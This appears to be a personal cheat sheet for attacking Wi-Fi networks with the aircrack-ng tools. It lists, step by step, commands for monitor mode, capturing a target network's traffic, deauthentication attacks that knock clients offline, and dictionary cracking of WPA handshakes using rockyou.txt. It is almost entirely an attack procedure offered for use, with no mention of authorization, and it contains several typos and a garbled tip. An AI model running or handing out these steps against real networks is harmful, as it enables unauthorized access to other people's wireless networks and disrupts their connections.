###### WI-FI HACKING ######

Note: ALL ACTIONS MUST BE TAKEN IN ROOT OR USE SUDO AND WIFI ADAPTER MUST BE IN MONITOR MODE


########## MONITOR MODE SET-UP ###########

airmon-ng

airmon-ng start wlan0

##### RECONNAISANCE #######

airodump wlan0

TIP: The lower the power the closer the wireless pointrr

airodump-ng --channel <channel number> --bbsid <router bssid> --write <Desiredfilename> wlan0
  
												                --> keep running until the end of the hack session.

airodump-ng -c <channel number> --bssid <router bssid> -w <file name / desired location (listfull directory)>

TIP: The BSSID number is also the device mAC address

########## DEAUTHENTICATION ATTACK ##########

command-->> aireplay-ng --deauth <number_of_deauth_packets> -a <wifi_bssid> -c <target_bssid> wlan0
					
						Alternatively

	    aireplay-ng -0 <number_of_deuath_packets> -a <wifi_bssid> -c <target_bssid> wlan0

######## WPA CRACKING #########

WPA has a more security and we would have to carry out a dictionary attcack, a popular wordlist would be seclist (can be taken from github), and rockyou.txt, they usaully come with a kali machine pre installed, it would be located by navigating to /usr/share/wordlist/* directory.


commmands-->> aircrack-ng -a2 -b <> -w <wordlist fullpath> wifi.cap file (full path)

TIP: The number 2 specifies what wpa version it is
